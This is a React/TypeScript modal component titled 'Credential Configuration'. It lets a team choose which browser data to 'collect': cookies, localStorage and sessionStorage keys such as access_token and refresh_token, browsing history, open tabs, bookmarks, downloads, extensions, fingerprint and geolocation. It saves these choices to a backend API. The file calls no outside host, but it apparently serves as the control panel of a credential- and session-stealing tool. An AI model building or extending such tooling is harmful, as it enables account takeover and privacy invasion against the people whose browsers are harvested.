'use client'

import { useState, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Loader2, AlertTriangle, Save, X, Plus } from 'lucide-react'

interface CredentialConfigProps {
  teamId: string
  teamName: string
  onClose: () => void
}

interface ConfigField {
  field: string
  label: string
  description: string
}

interface CredentialConfigData {
  id?: string
  teamId?: string
  createdBy?: string
  name?: string
  description?: string
  ipAddress?: string
  userAgent?: string
  platform?: string
  browser?: string
  cookies?: string
  localStorage?: string
  sessionStorage?: string
  fingerprint?: string
  geoLocation?: string
  metadata?: string
  browserHistory?: string
  tabs?: string
  bookmarks?: string
  downloads?: string
  extensions?: string
  isActive?: boolean
  createdAt?: string
  updatedAt?: string
  [key: string]: any
}

const CONFIG_FIELDS: ConfigField[] = [
  // Browser environment data
  { field: 'ipAddress', label: 'IP Address', description: 'IPv4/IPv6 address' },
  { field: 'userAgent', label: 'User Agent', description: 'Raw browser user agent string' },
  { field: 'platform', label: 'Platform', description: 'OS / device type' },
  { field: 'browser', label: 'Browser', description: 'Browser name/version' },
  
  // Browser storage data
  { field: 'cookies', label: 'Cookies', description: 'Browser cookies data' },
  { field: 'localStorage', label: 'Local Storage', description: 'Browser localStorage data' },
  { field: 'sessionStorage', label: 'Session Storage', description: 'Browser sessionStorage data' },
  
  // Advanced browser data
  { field: 'fingerprint', label: 'Fingerprint', description: 'Browser fingerprint data' },
  { field: 'geoLocation', label: 'Geo Location', description: 'Location data' },
  { field: 'metadata', label: 'Metadata', description: 'Additional metadata' },
  
  // Extended browser data
  { field: 'browserHistory', label: 'Browser History', description: 'Browsing history' },
  { field: 'tabs', label: 'Tabs', description: 'Open tabs information' },
  { field: 'bookmarks', label: 'Bookmarks', description: 'Browser bookmarks' },
  { field: 'downloads', label: 'Downloads', description: 'Download history' },
  { field: 'extensions', label: 'Extensions', description: 'Installed extensions' },
]

export default function CredentialConfig({ teamId, teamName, onClose }: CredentialConfigProps) {
  const [config, setConfig] = useState<CredentialConfigData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [isSaving, setIsSaving] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [hasConfig, setHasConfig] = useState(false)

  const loadConfig = async () => {
    try {
      setIsLoading(true)
      setError(null)
      
      const token = localStorage.getItem('choco_token')
      if (!token) {
        setError('No authentication token found')
        return
      }

      const response = await fetch(`/api/credentials/config?teamId=${teamId}`, {
        headers: { 'Authorization': `Bearer ${token}` }
      })

      if (!response.ok) {
        throw new Error('Failed to fetch config')
      }

      const data = await response.json()
      if (data.success && data.data.config) {
        setConfig(data.data.config)
        setHasConfig(true)
      } else {
        // No config exists, create default
        const defaultConfig = CONFIG_FIELDS.reduce((acc, field) => {
          acc[field.field] = 'none'
          return acc
        }, {} as any)
        defaultConfig.name = `${teamName} Config`
        defaultConfig.description = `Credential collection configuration for ${teamName}`
        setConfig(defaultConfig)
        setHasConfig(false)
      }
    } catch (error) {
      console.error('Failed to load config:', error)
      setError('Failed to load configuration')
    } finally {
      setIsLoading(false)
    }
  }

  useEffect(() => {
    loadConfig()
  }, [teamId])

  const handleFieldChange = (field: string, value: string) => {
    setConfig(prev => ({
      ...prev,
      [field]: value
    }))
  }

  const handleCustomKeysChange = (field: string, tags: string[]) => {
    setConfig(prev => ({
      ...prev,
      [field]: JSON.stringify(tags)
    }))
  }

  const addTag = (field: string, tag: string) => {
    if (!tag.trim()) return
    const currentTags = getFieldTags(field)
    if (!currentTags.includes(tag.trim())) {
      handleCustomKeysChange(field, [...currentTags, tag.trim()])
    }
  }

  const removeTag = (field: string, tagToRemove: string) => {
    const currentTags = getFieldTags(field)
    handleCustomKeysChange(field, currentTags.filter(tag => tag !== tagToRemove))
  }

  const getFieldTags = (field: string): string[] => {
    const value = config?.[field]
    if (!value || value === 'none' || value === 'full') return []
    try {
      return JSON.parse(value)
    } catch {
      return []
    }
  }

  const handleSave = async () => {
    try {
      setIsSaving(true)
      setError(null)
      
      const token = localStorage.getItem('choco_token')
      if (!token) {
        setError('No authentication token found')
        return
      }

      const method = hasConfig ? 'PUT' : 'POST'
      const response = await fetch('/api/credentials/config', {
        method,
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...config,
          teamId,
        }),
      })

      const result = await response.json()
      if (result.success) {
        alert('Configuration saved successfully')
        setHasConfig(true) 
        onClose() // Close modal on successful save
      } else {
        setError(result.message || 'Failed to save configuration')
      }
    } catch (error) {
      console.error('Failed to save config:', error)
      setError('Failed to save configuration')
    } finally {
      setIsSaving(false)
    }
  }


  const TagInput = ({ field }: { field: string }) => {
    const [inputValue, setInputValue] = useState('')
    const tags = getFieldTags(field)

    const handleKeyPress = (e: React.KeyboardEvent) => {
      if (e.key === 'Enter' || e.key === ',') {
        e.preventDefault()
        addTag(field, inputValue)
        setInputValue('')
      }
    }

    const handleAddClick = () => {
      addTag(field, inputValue)
      setInputValue('')
    }

    return (
      <div className="space-y-2">
        <div className="flex flex-wrap gap-1 sm:gap-2 mb-2">
          {tags.map((tag, index) => (
            <Badge
              key={index}
              variant="secondary"
              className="flex items-center gap-1 px-2 py-1 text-xs"
            >
              <span className="truncate max-w-[120px] sm:max-w-none">{tag}</span>
              <X
                className="h-3 w-3 cursor-pointer hover:text-red-600 flex-shrink-0"
                onClick={() => removeTag(field, tag)}
              />
            </Badge>
          ))}
        </div>
        <div className="flex gap-2">
          <input
            type="text"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            onKeyPress={handleKeyPress}
            className="flex-1 border border-gray-300 rounded-md px-3 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
            placeholder="Type a key and press Enter or comma"
          />
          <Button
            type="button"
            size="sm"
            variant="outline"
            onClick={handleAddClick}
            disabled={!inputValue.trim()}
            className="flex-shrink-0"
          >
            <Plus className="h-4 w-4" />
          </Button>
        </div>
        <p className="text-xs text-gray-500">
          Add specific keys to extract (e.g., access_token, refresh_token)
        </p>
      </div>
    )
  }

  const getFieldType = (field: string) => {
    const value = config?.[field] || 'none'
    if (value === 'none' || value === 'full') return value
    return 'custom'
  }

  if (isLoading) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <div className="bg-white rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-y-auto">
          <div className="flex items-center justify-center py-12">
            <div className="text-center">
              <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4 text-blue-600" />
              <p className="text-slate-600">Loading configuration...</p>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-2 sm:p-4 z-50">
      <div className="bg-white rounded-lg w-full max-w-6xl h-[95vh] sm:h-[90vh] flex flex-col">
        {/* Header - Fixed */}
        <div className="flex justify-between items-center p-4 sm:p-6 border-b border-gray-200 flex-shrink-0">
          <div>
            <h3 className="text-lg sm:text-xl font-semibold text-gray-900">
              Credential Configuration
            </h3>
            <p className="text-xs sm:text-sm text-gray-600 mt-1">
              Configure data collection for team: <strong>{teamName}</strong>
            </p>
          </div>
          <Button variant="outline" size="sm" onClick={onClose}>
            <X className="h-4 w-4" />
          </Button>
        </div>

        {/* Scrollable Content */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-6">
          {!hasConfig && (
            <div className="bg-yellow-50 border border-yellow-200 rounded-md p-3 sm:p-4 mb-4 sm:mb-6">
              <div className="flex items-start">
                <AlertTriangle className="h-4 w-4 sm:h-5 sm:w-5 text-yellow-600 mr-2 mt-0.5 flex-shrink-0" />
                <div>
                  <h4 className="text-xs sm:text-sm font-medium text-yellow-800">No Configuration Found</h4>
                  <p className="text-xs sm:text-sm text-yellow-700 mt-1">
                    This team doesn't have a credential collection configuration. Create one to define what data should be collected.
                  </p>
                </div>
              </div>
            </div>
          )}

          {error && (
            <div className="bg-red-50 border border-red-200 rounded-md p-3 sm:p-4 mb-4 sm:mb-6">
              <p className="text-xs sm:text-sm text-red-800">{error}</p>
            </div>
          )}

          <div className="space-y-4 sm:space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-3 sm:gap-4">
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1">
                  Configuration Name
                </label>
                <input
                  type="text"
                  value={config?.name || ''}
                  onChange={(e) => handleFieldChange('name', e.target.value)}
                  className="w-full border border-gray-300 rounded-md px-3 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter configuration name"
                />
              </div>
              <div>
                <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-1">
                  Description
                </label>
                <input
                  type="text"
                  value={config?.description || ''}
                  onChange={(e) => handleFieldChange('description', e.target.value)}
                  className="w-full border border-gray-300 rounded-md px-3 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Enter description"
                />
              </div>
            </div>

            <div>
              <h4 className="text-base sm:text-lg font-medium text-gray-900 mb-3 sm:mb-4">Data Collection Settings</h4>
              <div className="space-y-3 sm:space-y-4">
                {CONFIG_FIELDS.map((fieldConfig) => (
                  <div key={fieldConfig.field} className="border border-gray-200 rounded-lg p-3 sm:p-4">
                    <div className="flex flex-col sm:flex-row sm:justify-between sm:items-start mb-3 space-y-2 sm:space-y-0">
                      <div className="flex-1">
                        <h5 className="text-sm sm:text-base font-medium text-gray-900">{fieldConfig.label}</h5>
                        <p className="text-xs sm:text-sm text-gray-600">{fieldConfig.description}</p>
                      </div>
                      <Badge variant={getFieldType(fieldConfig.field) === 'none' ? 'secondary' : 'default'} className="self-start">
                        {getFieldType(fieldConfig.field)}
                      </Badge>
                    </div>
                    
                    <div className="space-y-3">
                      <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-4">
                        <label className="flex items-center">
                          <input
                            type="radio"
                            name={fieldConfig.field}
                            value="none"
                            checked={getFieldType(fieldConfig.field) === 'none'}
                            onChange={() => handleFieldChange(fieldConfig.field, 'none')}
                            className="mr-2"
                          />
                          <span className="text-xs sm:text-sm">None</span>
                        </label>
                        <label className="flex items-center">
                          <input
                            type="radio"
                            name={fieldConfig.field}
                            value="full"
                            checked={getFieldType(fieldConfig.field) === 'full'}
                            onChange={() => handleFieldChange(fieldConfig.field, 'full')}
                            className="mr-2"
                          />
                          <span className="text-xs sm:text-sm">Full</span>
                        </label>
                        <label className="flex items-center">
                          <input
                            type="radio"
                            name={fieldConfig.field}
                            value="custom"
                            checked={getFieldType(fieldConfig.field) === 'custom'}
                            onChange={() => handleFieldChange(fieldConfig.field, '[]')}
                            className="mr-2"
                          />
                          <span className="text-xs sm:text-sm">Specific Keys</span>
                        </label>
                      </div>
                      
                      {getFieldType(fieldConfig.field) === 'custom' && (
                        <TagInput field={fieldConfig.field} />
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Sticky Footer */}
        <div className="flex-shrink-0 border-t border-gray-200 p-4 sm:p-6 bg-gray-50">
          <div className="flex justify-end space-x-3">
            <Button 
              variant="outline" 
              onClick={onClose} 
              disabled={isSaving}
              className="flex-1 sm:flex-none"
            >
              Cancel
            </Button>
            <Button 
              onClick={handleSave} 
              disabled={isSaving}
              className="flex-1 sm:flex-none"
            >
              {isSaving ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  <span className="hidden sm:inline">Saving...</span>
                  <span className="sm:hidden">Save</span>
                </>
              ) : (
                <>
                  <Save className="w-4 h-4 mr-2" />
                  <span className="hidden sm:inline">Save Configuration</span>
                  <span className="sm:hidden">Save</span>
                </>
              )}
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}
